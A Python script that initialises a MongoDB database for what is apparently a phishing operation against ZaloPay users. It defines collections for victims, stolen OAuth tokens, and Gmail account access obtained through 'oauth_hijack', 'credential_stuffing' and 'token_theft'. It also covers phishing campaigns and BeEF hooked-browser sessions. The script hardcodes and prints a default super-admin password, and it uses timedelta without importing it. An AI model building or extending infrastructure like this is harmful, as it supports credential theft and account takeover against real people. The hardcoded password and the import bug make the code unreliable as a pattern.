"""
Database Initialization Script
Initialize MongoDB database with all collections, indexes, and default data
"""

import os
import sys
from datetime import datetime, timezone
from typing import Dict, List, Optional, Any
from pymongo import MongoClient
from pymongo.errors import PyMongoError, ServerSelectionTimeoutError
import logging
import json
import argparse

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class DatabaseInitializer:
    """MongoDB database initialization"""

    def __init__(self, connection_string: str = None, database_name: str = "zalopay_phishing"):
        self.connection_string = connection_string or os.getenv(
            "MONGODB_URI",
            "mongodb://localhost:27017/zalopay_phishing"
        )
        self.database_name = database_name

        try:
            self.client = MongoClient(self.connection_string, serverSelectionTimeoutMS=5000)
            self.db = self.client.get_database(database_name)

            # Test connection
            self.client.admin.command('ping')
            logger.info(f"Connected to MongoDB: {self.database_name}")

        except ServerSelectionTimeoutError:
            logger.error("Failed to connect to MongoDB. Please check connection string.")
            raise
        except Exception as e:
            logger.error(f"Error connecting to MongoDB: {e}")
            raise

    def initialize_database(self, drop_existing: bool = False) -> bool:
        """
        Initialize database with all collections and indexes

        Args:
            drop_existing: Whether to drop existing collections

        Returns:
            bool: True if initialization successful
        """
        try:
            logger.info("Starting database initialization...")

            # Drop existing collections if requested
            if drop_existing:
                self._drop_all_collections()
                logger.info("Dropped existing collections")

            # Create collections with validation
            self._create_collections()

            # Create indexes
            self._create_all_indexes()

            # Insert default data
            self._insert_default_data()

            # Create admin user
            self._create_default_admin()

            logger.info("Database initialization completed successfully")
            return True

        except Exception as e:
            logger.error(f"Error during database initialization: {e}")
            return False

    def _drop_all_collections(self):
        """Drop all existing collections"""
        collections_to_drop = [
            "victims", "oauth_tokens", "admin_users", "campaigns",
            "activity_logs", "gmail_access_logs", "beef_sessions"
        ]

        for collection_name in collections_to_drop:
            try:
                collection = self.db[collection_name]
                collection.drop()
                logger.info(f"Dropped collection: {collection_name}")
            except PyMongoError as e:
                logger.warning(f"Error dropping collection {collection_name}: {e}")

    def _create_collections(self):
        """Create all collections with validation schemas"""
        logger.info("Creating collections with validation schemas...")

        # Victims collection
        try:
            victims_collection = self.db.create_collection("victims")
            self._create_victim_validation()
            logger.info("Created victims collection")
        except PyMongoError as e:
            logger.warning(f"Error creating victims collection: {e}")

        # OAuth tokens collection
        try:
            oauth_collection = self.db.create_collection("oauth_tokens")
            self._create_oauth_token_validation()
            logger.info("Created oauth_tokens collection")
        except PyMongoError as e:
            logger.warning(f"Error creating oauth_tokens collection: {e}")

        # Admin users collection
        try:
            admin_collection = self.db.create_collection("admin_users")
            self._create_admin_user_validation()
            logger.info("Created admin_users collection")
        except PyMongoError as e:
            logger.warning(f"Error creating admin_users collection: {e}")

        # Campaigns collection
        try:
            campaigns_collection = self.db.create_collection("campaigns")
            self._create_campaign_validation()
            logger.info("Created campaigns collection")
        except PyMongoError as e:
            logger.warning(f"Error creating campaigns collection: {e}")

        # Activity logs collection
        try:
            activity_collection = self.db.create_collection("activity_logs")
            self._create_activity_log_validation()
            logger.info("Created activity_logs collection")
        except PyMongoError as e:
            logger.warning(f"Error creating activity_logs collection: {e}")

        # Gmail access logs collection
        try:
            gmail_collection = self.db.create_collection("gmail_access_logs")
            self._create_gmail_access_validation()
            logger.info("Created gmail_access_logs collection")
        except PyMongoError as e:
            logger.warning(f"Error creating gmail_access_logs collection: {e}")

        # BeEF sessions collection
        try:
            beef_collection = self.db.create_collection("beef_sessions")
            self._create_beef_session_validation()
            logger.info("Created beef_sessions collection")
        except PyMongoError as e:
            logger.warning(f"Error creating beef_sessions collection: {e}")

    def _create_victim_validation(self):
        """Create validation schema for victims collection"""
        pipeline = [
            {
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["victim_id", "email", "personal_info", "status", "created_at", "risk_score"],
                    "properties": {
                        "victim_id": {
                            "bsonType": "string",
                            "pattern": "^VIC_[0-9]{8}_[A-Z0-9]{6}$"
                        },
                        "email": {
                            "bsonType": "string",
                            "pattern": "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$"
                        },
                        "status": {
                            "bsonType": "string",
                            "enum": ["active", "inactive", "compromised", "blocked", "archived"]
                        },
                        "risk_score": {
                            "bsonType": "int",
                            "minimum": 0,
                            "maximum": 100
                        }
                    }
                }
            }
        ]

        self.db.command("collMod", "victims", validator=pipeline[0]["$jsonSchema"])

    def _create_oauth_token_validation(self):
        """Create validation schema for OAuth tokens collection"""
        pipeline = [
            {
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["token_id", "user_id", "provider", "encrypted_token", "status", "created_at", "expires_at"],
                    "properties": {
                        "token_id": {
                            "bsonType": "string",
                            "pattern": "^TOKEN_[0-9]{8}_[A-Z0-9]{8}$"
                        },
                        "provider": {
                            "bsonType": "string",
                            "enum": ["google", "facebook", "apple", "github", "microsoft"]
                        },
                        "status": {
                            "bsonType": "string",
                            "enum": ["active", "expired", "revoked", "invalid"]
                        }
                    }
                }
            }
        ]

        self.db.command("collMod", "oauth_tokens", validator=pipeline[0]["$jsonSchema"])

    def _create_admin_user_validation(self):
        """Create validation schema for admin users collection"""
        pipeline = [
            {
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["admin_id", "username", "email", "password_hash", "role", "status", "created_at"],
                    "properties": {
                        "admin_id": {
                            "bsonType": "string",
                            "pattern": "^ADMIN_[0-9]{8}_[A-Z0-9]{6}$"
                        },
                        "username": {
                            "bsonType": "string",
                            "pattern": "^[a-zA-Z0-9_]{3,32}$"
                        },
                        "role": {
                            "bsonType": "string",
                            "enum": ["super_admin", "admin", "moderator", "analyst", "viewer"]
                        },
                        "status": {
                            "bsonType": "string",
                            "enum": ["active", "inactive", "suspended", "locked"]
                        }
                    }
                }
            }
        ]

        self.db.command("collMod", "admin_users", validator=pipeline[0]["$jsonSchema"])

    def _create_campaign_validation(self):
        """Create validation schema for campaigns collection"""
        pipeline = [
            {
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["campaign_id", "name", "campaign_type", "status", "created_by", "created_at", "targeting", "performance"],
                    "properties": {
                        "campaign_id": {
                            "bsonType": "string",
                            "pattern": "^CAMP_[0-9]{8}_[A-Z0-9]{6}$"
                        },
                        "campaign_type": {
                            "bsonType": "string",
                            "enum": ["phishing_email", "phishing_sms", "vishing", "smishing", "spear_phishing", "whaling", "watering_hole", "clone_site", "beef_hook"]
                        },
                        "status": {
                            "bsonType": "string",
                            "enum": ["planning", "active", "paused", "completed", "cancelled", "failed"]
                        }
                    }
                }
            }
        ]

        self.db.command("collMod", "campaigns", validator=pipeline[0]["$jsonSchema"])

    def _create_activity_log_validation(self):
        """Create validation schema for activity logs collection"""
        pipeline = [
            {
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["activity_id", "activity_type", "severity", "timestamp", "user_id", "description"],
                    "properties": {
                        "activity_id": {
                            "bsonType": "string",
                            "pattern": "^ACT_[0-9]{8}_[A-Z0-9]{8}$"
                        }
                    }
                }
            }
        ]

        self.db.command("collMod", "activity_logs", validator=pipeline[0]["$jsonSchema"])

    def _create_gmail_access_validation(self):
        """Create validation schema for Gmail access logs collection"""
        pipeline = [
            {
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["access_id", "victim_id", "gmail_account", "access_method", "access_timestamp", "access_status"],
                    "properties": {
                        "access_id": {
                            "bsonType": "string",
                            "pattern": "^GMAIL_[0-9]{8}_[A-Z0-9]{6}$"
                        },
                        "access_method": {
                            "bsonType": "string",
                            "enum": ["oauth_hijack", "credential_stuffing", "phishing", "session_hijacking", "token_theft", "brute_force"]
                        },
                        "access_status": {
                            "bsonType": "string",
                            "enum": ["active", "expired", "revoked", "failed", "blocked"]
                        }
                    }
                }
            }
        ]

        self.db.command("collMod", "gmail_access_logs", validator=pipeline[0]["$jsonSchema"])

    def _create_beef_session_validation(self):
        """Create validation schema for BeEF sessions collection"""
        pipeline = [
            {
                "$jsonSchema": {
                    "bsonType": "object",
                    "required": ["session_id", "hooked_browser_id", "victim_id", "browser_info", "first_seen", "session_status"],
                    "properties": {
                        "session_id": {
                            "bsonType": "string",
                            "pattern": "^BEEF_[0-9]{8}_[A-Z0-9]{8}$"
                        },
                        "session_status": {
                            "bsonType": "string",
                            "enum": ["active", "expired", "killed", "lost"]
                        }
                    }
                }
            }
        ]

        self.db.command("collMod", "beef_sessions", validator=pipeline[0]["$jsonSchema"])

    def _create_all_indexes(self):
        """Create all indexes for all collections"""
        logger.info("Creating indexes...")

        # Victims indexes
        try:
            victims = self.db.victims
            victims.create_index("victim_id", unique=True)
            victims.create_index("email", unique=True)
            victims.create_index("status")
            victims.create_index("created_at")
            logger.info("Created victims indexes")
        except PyMongoError as e:
            logger.warning(f"Error creating victims indexes: {e}")

        # OAuth tokens indexes
        try:
            oauth_tokens = self.db.oauth_tokens
            oauth_tokens.create_index("token_id", unique=True)
            oauth_tokens.create_index("user_id")
            oauth_tokens.create_index("provider")
            oauth_tokens.create_index("expires_at", expireAfterSeconds=0)
            logger.info("Created oauth_tokens indexes")
        except PyMongoError as e:
            logger.warning(f"Error creating oauth_tokens indexes: {e}")

        # Admin users indexes
        try:
            admin_users = self.db.admin_users
            admin_users.create_index("admin_id", unique=True)
            admin_users.create_index("username", unique=True)
            admin_users.create_index("email", unique=True)
            admin_users.create_index("status")
            logger.info("Created admin_users indexes")
        except PyMongoError as e:
            logger.warning(f"Error creating admin_users indexes: {e}")

        # Campaigns indexes
        try:
            campaigns = self.db.campaigns
            campaigns.create_index("campaign_id", unique=True)
            campaigns.create_index("name", unique=True)
            campaigns.create_index("status")
            campaigns.create_index("created_at")
            logger.info("Created campaigns indexes")
        except PyMongoError as e:
            logger.warning(f"Error creating campaigns indexes: {e}")

        # Activity logs indexes
        try:
            activity_logs = self.db.activity_logs
            activity_logs.create_index("activity_id", unique=True)
            activity_logs.create_index("timestamp")
            activity_logs.create_index("activity_type")
            activity_logs.create_index("user_id")
            activity_logs.create_index("timestamp", expireAfterSeconds=7776000)  # 90 days
            logger.info("Created activity_logs indexes")
        except PyMongoError as e:
            logger.warning(f"Error creating activity_logs indexes: {e}")

        # Gmail access logs indexes
        try:
            gmail_logs = self.db.gmail_access_logs
            gmail_logs.create_index("access_id", unique=True)
            gmail_logs.create_index("victim_id")
            gmail_logs.create_index("access_timestamp")
            gmail_logs.create_index("access_timestamp", expireAfterSeconds=15552000)  # 180 days
            logger.info("Created gmail_access_logs indexes")
        except PyMongoError as e:
            logger.warning(f"Error creating gmail_access_logs indexes: {e}")

        # BeEF sessions indexes
        try:
            beef_sessions = self.db.beef_sessions
            beef_sessions.create_index("session_id", unique=True)
            beef_sessions.create_index("victim_id")
            beef_sessions.create_index("first_seen")
            beef_sessions.create_index("first_seen", expireAfterSeconds=2592000)  # 30 days
            logger.info("Created beef_sessions indexes")
        except PyMongoError as e:
            logger.warning(f"Error creating beef_sessions indexes: {e}")

    def _insert_default_data(self):
        """Insert default system data"""
        logger.info("Inserting default data...")

        # Insert system configuration
        try:
            system_config = {
                "key": "system_config",
                "database_version": "1.0.0",
                "initialized_at": datetime.now(timezone.utc),
                "features": {
                    "mfa_required": True,
                    "password_expiry_days": 90,
                    "session_timeout_minutes": 60,
                    "max_login_attempts": 5,
                    "audit_log_retention_days": 90
                },
                "security": {
                    "encryption_enabled": True,
                    "backup_encryption": True,
                    "secure_headers": True
                }
            }

            self.db.system_config.update_one(
                {"key": "system_config"},
                {"$set": system_config},
                upsert=True
            )

            logger.info("Inserted system configuration")

        except PyMongoError as e:
            logger.warning(f"Error inserting system config: {e}")

    def _create_default_admin(self):
        """Create default super admin user"""
        try:
            # Check if admin already exists
            existing_admin = self.db.admin_users.find_one({"role": "super_admin"})
            if existing_admin:
                logger.info("Default admin already exists")
                return

            # Create default admin
            import secrets
            from bcrypt import hashpw, gensalt

            default_password = "Admin@2024!"  # Should be changed on first login
            password_hash = hashpw(default_password.encode('utf-8'), gensalt(rounds=12)).decode('utf-8')

            default_admin = {
                "admin_id": "ADMIN_20241017_SUPER1",
                "username": "superadmin",
                "email": "admin@zalopay.local",
                "password_hash": password_hash,
                "role": "super_admin",
                "status": "active",
                "personal_info": {
                    "first_name": "Super",
                    "last_name": "Administrator"
                },
                "mfa_enabled": False,
                "permissions": [
                    "admin.create", "admin.read", "admin.update", "admin.delete",
                    "victim.create", "victim.read", "victim.update", "victim.delete",
                    "campaign.create", "campaign.read", "campaign.update", "campaign.delete",
                    "system.config", "system.audit", "system.backup"
                ],
                "failed_login_attempts": 0,
                "last_login": None,
                "last_password_change": datetime.now(timezone.utc),
                "password_expires_at": datetime.now(timezone.utc) + timedelta(days=90),
                "session_timeout": 3600,
                "created_at": datetime.now(timezone.utc),
                "updated_at": datetime.now(timezone.utc),
                "created_by": "system"
            }

            result = self.db.admin_users.insert_one(default_admin)

            if result.inserted_id:
                logger.info("Created default super admin user")
                logger.info(f"Username: superadmin")
                logger.info(f"Password: {default_password}")
                logger.warning("Please change the default password after first login!")

        except PyMongoError as e:
            logger.warning(f"Error creating default admin: {e}")

    def verify_initialization(self) -> Dict[str, Any]:
        """Verify database initialization"""
        verification = {
            "database_name": self.database_name,
            "collections": {},
            "indexes": {},
            "default_data": {},
            "errors": []
        }

        try:
            # Check collections
            collections = self.db.list_collection_names()
            expected_collections = [
                "victims", "oauth_tokens", "admin_users", "campaigns",
                "activity_logs", "gmail_access_logs", "beef_sessions", "system_config"
            ]

            for collection_name in expected_collections:
                exists = collection_name in collections
                verification["collections"][collection_name] = exists
                if not exists:
                    verification["errors"].append(f"Missing collection: {collection_name}")

            # Check admin user
            admin_count = self.db.admin_users.count_documents({"role": "super_admin"})
            verification["default_data"]["admin_user_created"] = admin_count > 0
            if admin_count == 0:
                verification["errors"].append("No super admin user found")

            # Check system config
            config = self.db.system_config.find_one({"key": "system_config"})
            verification["default_data"]["system_config_created"] = config is not None
            if not config:
                verification["errors"].append("System configuration not found")

            # Check indexes (basic check)
            for collection_name in expected_collections[:7]:  # Exclude system_config
                try:
                    collection = self.db[collection_name]
                    indexes = list(collection.list_indexes())
                    verification["indexes"][collection_name] = len(indexes) > 1  # More than just _id_ index
                except Exception as e:
                    verification["indexes"][collection_name] = False
                    verification["errors"].append(f"Error checking indexes for {collection_name}: {e}")

            verification["success"] = len(verification["errors"]) == 0
            return verification

        except Exception as e:
            verification["errors"].append(f"Error during verification: {e}")
            verification["success"] = False
            return verification

    def create_backup(self, backup_name: str = None) -> str:
        """Create database backup"""
        try:
            if not backup_name:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                backup_name = f"zalopay_backup_{timestamp}"

            # Use mongodump (requires mongo tools to be installed)
            import subprocess

            backup_path = f"./backups/{backup_name}"

            # Create backups directory if it doesn't exist
            os.makedirs("./backups", exist_ok=True)

            # Run mongodump
            cmd = [
                "mongodump",
                f"--uri={self.connection_string}",
                f"--db={self.database_name}",
                "--out", backup_path,
                "--gzip"
            ]

            result = subprocess.run(cmd, capture_output=True, text=True)

            if result.returncode == 0:
                logger.info(f"Database backup created: {backup_path}")
                return backup_path
            else:
                logger.error(f"Backup failed: {result.stderr}")
                raise Exception(f"Backup failed: {result.stderr}")

        except FileNotFoundError:
            logger.error("mongodump not found. Please install MongoDB tools.")
            raise
        except Exception as e:
            logger.error(f"Error creating backup: {e}")
            raise

def main():
    """Main initialization function"""
    parser = argparse.ArgumentParser(description="Initialize ZaloPay Phishing Database")
    parser.add_argument("--connection-string", help="MongoDB connection string")
    parser.add_argument("--database-name", default="zalopay_phishing", help="Database name")
    parser.add_argument("--drop-existing", action="store_true", help="Drop existing collections")
    parser.add_argument("--verify-only", action="store_true", help="Only verify initialization")
    parser.add_argument("--create-backup", action="store_true", help="Create backup before initialization")

    args = parser.parse_args()

    try:
        # Initialize database
        initializer = DatabaseInitializer(args.connection_string, args.database_name)

        # Create backup if requested
        if args.create_backup:
            logger.info("Creating database backup...")
            backup_path = initializer.create_backup()
            logger.info(f"Backup created: {backup_path}")

        # Verify only if requested
        if args.verify_only:
            logger.info("Verifying database initialization...")
            verification = initializer.verify_initialization()
            print(json.dumps(verification, indent=2, default=str))
            return

        # Initialize database
        success = initializer.initialize_database(args.drop_existing)

        if success:
            # Verify initialization
            verification = initializer.verify_initialization()

            if verification["success"]:
                logger.info("Database initialization completed successfully!")
                print("\n=== Database Initialization Summary ===")
                print(f"Database: {args.database_name}")
                print(f"Collections created: {len([c for c in verification['collections'].values() if c])}/{len(verification['collections'])}")
                print(f"Default admin created: {verification['default_data']['admin_user_created']}")
                print(f"System config created: {verification['default_data']['system_config_created']}")
                print("\nDefault admin credentials:")
                print("Username: superadmin")
                print("Password: Admin@2024!")
                print("\nIMPORTANT: Change the default password after first login!")
            else:
                logger.error("Database initialization completed with errors")
                print("\n=== Initialization Errors ===")
                for error in verification["errors"]:
                    print(f"- {error}")
        else:
            logger.error("Database initialization failed")
            sys.exit(1)

    except Exception as e:
        logger.error(f"Initialization script failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()